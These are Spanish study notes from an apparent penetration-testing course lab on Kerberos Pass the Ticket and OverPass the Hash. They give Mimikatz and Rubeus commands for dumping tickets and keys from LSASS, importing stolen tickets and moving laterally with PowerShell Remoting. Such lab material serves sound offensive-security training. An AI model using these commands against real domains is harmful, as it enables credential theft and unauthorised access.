
## 1. Conceptos de Kerberos

Kerberos es un protocolo de autenticación que utiliza tickets para permitir el acceso a servicios sin tener que enviar la contraseña del usuario a cada uno de ellos.

|Elemento|Descripción|
|---|---|
|**KDC (Key Distribution Center)**|Centro de distribución de claves que gestiona las solicitudes de tickets.|
|**TGT (Ticket Granting Ticket)**|Ticket que permite solicitar tickets de servicio adicionales.|
|**TGS (Ticket Granting Service / Ticket de servicio)**|Ticket que permite autenticarse ante un servicio específico.|
|**LSASS**|Proceso de Windows que gestiona la autenticación y almacena los tickets Kerberos en las sesiones de inicio de sesión.|
|`**.kirbi**`|Formato de archivo utilizado para almacenar tickets Kerberos en las herramientas mostradas.|

### Flujo de autenticación

1. El usuario se autentica ante el KDC y obtiene un **TGT**.
    
2. Cuando necesita acceder a un servicio, presenta el TGT para solicitar un **TGS**.
    
3. El usuario presenta el TGS al servicio correspondiente.
    
4. El servicio valida el ticket y permite el acceso según los privilegios del usuario.
    

## 2. Ataque Pass the Ticket (PtT)

El ataque **Pass the Ticket (PtT)** consiste en reutilizar un ticket Kerberos válido robado para autenticarse ante servicios o recursos del dominio.

Se pueden utilizar dos tipos de tickets:

- **TGT:** permite solicitar tickets de servicio para los recursos a los que el usuario tenga acceso.
    
- **TGS:** permite acceder al servicio específico para el que se emitió el ticket.
    

A diferencia de Pass the Hash (PtH), que reutiliza un hash NTLM, PtT utiliza tickets Kerberos.

## 3. Obtener tickets Kerberos en Windows

Windows almacena los tickets Kerberos en LSASS. Un usuario normal puede obtener sus propios tickets, mientras que un administrador local puede recolectar los tickets de las distintas sesiones.

### 3.1. Exportar tickets con Mimikatz

Ejecutar Mimikatz con privilegios administrativos:

```
mimikatz.exe
```

Habilitar los privilegios de depuración:

```
privilege::debug
```

Exportar los tickets Kerberos:

```
sekurlsa::tickets /export
```

Los tickets se guardarán como archivos `.kirbi`.

Para comprobar los archivos exportados:

```
dir *.kirbi
```

**Identificación de tickets:**

- Los nombres que terminan en `$` suelen corresponder a cuentas de equipo.
    
- Un ticket cuyo servicio es `krbtgt` corresponde a un TGT.
    
- Los tickets asociados a otros servicios, como `LDAP` o `CIFS`, corresponden a servicios concretos.
    

### 3.2. Exportar tickets con Rubeus

Rubeus permite volcar los tickets Kerberos en formato Base64:

```
Rubeus.exe dump /nowrap
```

La opción `/nowrap` evita que la salida Base64 se divida en varias líneas, facilitando su copia.

La salida proporciona información como:

- Usuario y dominio.
    
- Servicio asociado al ticket.
    
- Fechas de inicio y expiración.
    
- Tipo de cifrado.
    
- Ticket codificado en Base64.
    

**Nota:** para recolectar los tickets de todas las sesiones se necesitan privilegios administrativos.

## 4. Pass the Key / OverPass the Hash

### 4.1. Concepto

**Pass the Key**, también conocido como **OverPass the Hash**, utiliza una clave de cifrado Kerberos o un hash compatible para obtener un TGT.

La diferencia principal es:

- **Pass the Hash (PtH):** reutiliza un hash NTLM para autenticarse mediante mecanismos compatibles con NTLM.
    
- **OverPass the Hash:** utiliza el material criptográfico de la cuenta para solicitar un TGT Kerberos.
    

Las claves pueden ser de distintos tipos, entre ellos:

- `rc4_hmac` — relacionado con el hash NTLM.
    
- `aes128_cts_hmac_sha1`.
    
- `aes256_cts_hmac_sha1`.
    

### 4.2. Extraer claves con Mimikatz

Ejecutar Mimikatz:

```
mimikatz.exe
```

Habilitar los privilegios de depuración:

```
privilege::debug
```

Extraer las claves Kerberos:

```
sekurlsa::ekeys
```

La salida puede mostrar claves como:

```
aes256_hmac
rc4_hmac_nt
rc4_hmac_old
rc4_md4
```

Estas claves pueden utilizarse para solicitar tickets, dependiendo del tipo de clave y del método empleado.

### 4.3. OverPass the Hash con Mimikatz

Ejemplo utilizando un hash NTLM:

```
sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:HASH_NTLM
```

El comando crea una nueva ventana de `cmd.exe` en el contexto preparado para utilizar las credenciales proporcionadas y solicitar acceso mediante Kerberos.

### 4.4. OverPass the Hash con Rubeus

Rubeus permite solicitar un TGT con `asktgt`.

Ejemplo utilizando una clave AES-256:

```
Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /aes256:HASH_AES256 /nowrap
```

También admite parámetros para otros tipos de clave:

|Parámetro|Tipo de clave|
|---|---|
|`/rc4`|RC4-HMAC|
|`/aes128`|AES-128|
|`/aes256`|AES-256|
|`/des`|DES|

Si la solicitud tiene éxito, Rubeus devuelve el TGT en Base64.

**Diferencia importante:** en los ejemplos del módulo, Mimikatz necesita privilegios administrativos para realizar OverPass the Hash, mientras que Rubeus puede solicitar un TGT con el material criptográfico disponible sin necesitar esos privilegios para esa operación concreta.

**Consideración de seguridad:** los dominios modernos utilizan normalmente AES para Kerberos. El uso de RC4 en determinados intercambios puede indicar una degradación del cifrado (_encryption downgrade_) y resultar sospechoso.

## 5. Pass the Ticket con Rubeus

Una vez obtenido un ticket, podemos importarlo en una sesión de inicio de sesión para utilizarlo en las conexiones posteriores.

### 5.1. Obtener e importar un TGT directamente

La opción `/ptt` solicita el TGT y lo importa automáticamente:

```
Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:HASH_NTLM /ptt
```

Si se importa correctamente, aparecerá un mensaje similar a:

```
[+] Ticket successfully imported!
```

### 5.2. Importar un ticket `.kirbi`

Si ya tenemos un ticket exportado:

```
Rubeus.exe ptt /ticket:ticket.kirbi
```

Si la importación funciona, Rubeus mostrará:

```
[+] ticket successfully imported!
```

### 5.3. Importar un ticket en Base64

También podemos importar el contenido Base64 del ticket:

```
Rubeus.exe ptt /ticket:BASE64_DEL_TICKET
```

Esto permite utilizar tickets obtenidos directamente de la salida de Rubeus o convertidos desde un archivo `.kirbi`.

### 5.4. Convertir un `.kirbi` a Base64 con PowerShell

```
[Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\tools\ticket.kirbi"))
```

La cadena resultante se puede utilizar con la opción `/ticket` de Rubeus.

## 6. Pass the Ticket con Mimikatz

Mimikatz también permite importar tickets Kerberos directamente desde archivos `.kirbi`.

Ejecutar Mimikatz:

```
mimikatz.exe
```

Habilitar los privilegios de depuración:

```
privilege::debug
```

Importar el ticket:

```
kerberos::ptt "C:\tools\ticket.kirbi"
```

Si la operación funciona, aparecerá:

```
* File: 'C:\tools\ticket.kirbi': OK
```

También se puede utilizar:

```
misc::cmd
```

Este comando permite abrir una nueva ventana de `cmd.exe` con el ticket importado, según el procedimiento descrito en el módulo.

## 7. Comprobar el acceso después de importar un ticket

En el ejemplo del módulo, tras importar un TGT válido, se accede al recurso administrativo compartido del controlador de dominio:

```
dir \\DC01.inlanefreight.htb\c$
```

Si la autenticación funciona y la cuenta tiene los permisos necesarios, se podrá listar el contenido del recurso.

**Importante:** importar un ticket no concede automáticamente privilegios adicionales. El acceso efectivo depende de la identidad representada por el ticket, su validez, el servicio de destino y los permisos de esa cuenta.

## 8. Movimiento lateral mediante PowerShell Remoting

**PowerShell Remoting** permite ejecutar comandos en equipos remotos mediante sesiones de PowerShell.

Puertos habituales:

|Protocolo|Puerto TCP|
|---|---|
|HTTP|5985|
|HTTPS|5986|

Para conectarse a un equipo remoto, el usuario debe ser administrador, pertenecer al grupo `Remote Management Users` o disponer de permisos explícitos de PowerShell Remoting.

### 8.1. Utilizar un ticket importado con Mimikatz

Después de importar el ticket en la sesión correspondiente:

```
powershell
```

Conectarse al equipo remoto:

```
Enter-PSSession -ComputerName DC01
```

Comprobar la identidad y el equipo remoto:

```
whoami
hostname
```

Si la conexión tiene éxito, `whoami` muestra la identidad utilizada en la sesión remota y `hostname` identifica el equipo de destino.

### 8.2. Crear una sesión de inicio de sesión con Rubeus

Rubeus permite crear un proceso con un inicio de sesión de tipo 9, equivalente al comportamiento de `runas /netonly`.

```
Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
```

Opciones importantes:

- `/program`: programa que se ejecutará.
    
- `/show`: muestra la nueva ventana del proceso.
    

El comando devuelve información como el PID y el LUID de la nueva sesión.

Después, desde la nueva ventana, se puede solicitar e importar un TGT:

```
Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:HASH_AES256 /ptt
```

A continuación, se puede abrir PowerShell y conectarse al equipo remoto:

```
Enter-PSSession -ComputerName DC01
```

El uso de una sesión independiente permite trabajar con un contexto de autenticación separado del inicio de sesión original.

## 9. Consideraciones y errores importantes

- **Permisos:** obtener todos los tickets de LSASS con Mimikatz o volcar los tickets de todas las sesiones requiere privilegios administrativos.
    
- **Validez:** un ticket debe ser válido y corresponder a la identidad y al servicio necesarios.
    
- **Privilegios:** un ticket no convierte por sí solo una cuenta normal en administrador.
    
- **Cifrado:** el uso de RC4 en lugar de AES puede generar indicadores de degradación del cifrado.
    
- **Mimikatz y las claves:** algunas versiones de Mimikatz pueden mostrar incorrectamente los tipos de cifrado al ejecutar `sekurlsa::ekeys`. El módulo señala que, en determinadas versiones de Windows 10, esto puede afectar al uso de tickets exportados.
    
- **Rubeus:** permite exportar tickets en Base64, solicitar TGT e importar tickets mediante `/ptt`.
    
- **Movimiento lateral:** `Enter-PSSession` necesita que el usuario tenga los permisos necesarios y que PowerShell Remoting esté disponible en el equipo remoto.
    

## 10. Flujo de trabajo para el laboratorio

1. Obtener acceso al equipo Windows y determinar los privilegios disponibles.
    
2. Identificar los tickets Kerberos almacenados.
    
3. Exportar los tickets con Mimikatz o Rubeus.
    
4. Identificar el usuario, el dominio, el servicio y el tipo de ticket.
    
5. Si se dispone de una clave compatible, valorar OverPass the Hash para solicitar un TGT.
    
6. Importar el ticket mediante Rubeus (`ptt`) o Mimikatz (`kerberos::ptt`).
    
7. Comprobar el acceso a un recurso autorizado, como un recurso compartido SMB.
    
8. Si la cuenta dispone de permisos de PowerShell Remoting, probar una sesión remota con `Enter-PSSession`.
    
9. Verificar la identidad efectiva y los permisos disponibles.
    

## Resumen rápido

|Técnica / comando|Función|
|---|---|
|`sekurlsa::tickets /export`|Exportar tickets Kerberos a archivos `.kirbi`.|
|`Rubeus.exe dump /nowrap`|Mostrar tickets Kerberos en Base64.|
|`sekurlsa::ekeys`|Extraer claves de cifrado Kerberos disponibles en LSASS.|
|`sekurlsa::pth`|Preparar un contexto de autenticación utilizando un hash NTLM.|
|`Rubeus.exe asktgt`|Solicitar un TGT mediante una clave compatible.|
|`Rubeus.exe asktgt ... /ptt`|Solicitar e importar un TGT.|
|`Rubeus.exe ptt /ticket:ticket.kirbi`|Importar un ticket desde un archivo.|
|`kerberos::ptt`|Importar un ticket con Mimikatz.|
|`createnetonly`|Crear un proceso con un contexto de inicio de sesión de tipo 9.|
|`Enter-PSSession`|Iniciar una sesión de PowerShell Remoting.|

**Idea clave para CPTS/OSCP:** PtT reutiliza tickets Kerberos; OverPass the Hash utiliza material criptográfico de una cuenta para obtener un TGT. Una vez importado el ticket, el movimiento lateral depende de los permisos de la cuenta y de los servicios disponibles.
